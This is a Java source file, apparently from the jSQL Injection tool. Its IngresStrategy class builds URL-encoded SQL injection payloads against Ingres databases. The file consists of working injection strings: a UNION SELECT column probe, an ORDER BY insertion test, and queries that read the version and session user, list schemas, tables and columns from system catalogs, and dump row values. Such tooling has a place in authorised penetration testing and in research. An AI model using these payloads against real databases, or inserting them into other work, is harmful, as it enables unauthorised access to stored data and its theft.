package com.jsql.model.vendor;

import java.util.ArrayList;
import java.util.List;

import com.jsql.model.bean.Database;
import com.jsql.model.bean.Table;
import com.jsql.model.injection.MediatorModel;
import com.jsql.tool.ToolsString;

public class IngresStrategy extends ASQLStrategy {

    @Override
    public String getSchemaInfos() {
        return
            "SELECT+dbmsinfo('_version')||'{%}'||dbmsinfo('database')||'{%}'||dbmsinfo('session_user')||'{%}'||dbmsinfo('session_user')||0x01030307+r";
    }

    @Override
    public String getSchemaList() {
        return
            "select+rr||0x01030307+r+from(select+0x04||trim(t.schema_name)||'%050%04'rr+" +
            "from(select+distinct+schema_name+from+iischema)t,(select+distinct+schema_name+from+iischema)t1+" +
            "where+t.schema_name>=t1.schema_name+" +
            "group+by+1{limit})a";
    }

    @Override
    public String getTableList(Database database) {
        return
            "select+rr||0x01030307+r+from(select+0x04||trim(t.table_name)||'%050%04'rr+" +
            "from(select+distinct+table_name+from+iiingres_tables+where+table_owner='" + database + "')t,(select+distinct+table_name+from+iiingres_tables+where+table_owner='" + database + "')t1+" +
            "where+t.table_name>=t1.table_name+" +
            "group+by+1{limit})a";
    }

    @Override
    public String getColumnList(Table table) {
        return
            "select+rr||0x01030307+r+from(select+0x04||trim(t.column_name)||'%050%04'rr+" +
            "from(select+distinct+column_name+from+iiocolumns+where+table_owner='" + table.getParent() + "'and+table_name='" + table + "')t,(select+distinct+column_name+from+iiocolumns+where+table_owner='" + table.getParent() + "'and+table_name='" + table + "')t1+" +
            "where+t.column_name>=t1.column_name+" +
            "group+by+1{limit})a";
    }

    @Override
    public String getValues(String[] columns, Database database, Table table) {
        String formatListColumn = ToolsString.join(columns, "{%}");
        
        formatListColumn = formatListColumn.replace("{%}", "),''))||0x7f||trim(ifnull(varchar(");
        formatListColumn = "trim(ifnull(varchar(" + formatListColumn + "),''))";

        return
            "select+rr||0x01030307+r+from(select+0x04||trim(t.s)||'%050%04'rr+" +
            "from(select+distinct+" + formatListColumn +"s+from+\"" + database + "\"." + table + ")t,(select+distinct+" + formatListColumn + "+s+from+\"" + database + "\"." + table + ")t1+" +
            "where+t.s>=t1.s+" +
            "group+by+1{limit})a";
    }

    @Override
    public String normalStrategy(String sqlQuery, String startPosition) {
        return
            "'SQLi'||substr(r," + startPosition + ",65536)from(" + sqlQuery + ")x";
    }

    @Override
    public String performanceQuery(String[] indexes) {
        return
            MediatorModel.model().initialQuery.replaceAll(
                "1337(" + ToolsString.join(indexes, "|") + ")7331",
                "'SQLi$1'||rpad('%23',1024,'%23')||'iLQS'"
            );
    }

    @Override
    public String initialQuery(Integer nbFields) {
        String replaceTag = "";
        List<String> fields = new ArrayList<String>(); 
        for (int i = 1 ; i <= nbFields ; i++) {
            fields.add("*");
            replaceTag = "select+1337"+ i +"7330%2b1";
        }
        return "+union+select+" + ToolsString.join(fields.toArray(new String[fields.size()]), ",") + "+from(" + replaceTag + ")b+";
    }

    @Override
    public String insertionCharacterQuery() {
        return "+order+by+1337+";
    }

    @Override
    public String getLimit(Integer limitSQLResult) {
        return "+having+count(*)+between+" + (limitSQLResult+1) + "+and+" + (limitSQLResult+1);
    }
    
    @Override
    public String getDbLabel() {
        return "Ingres";
    }
}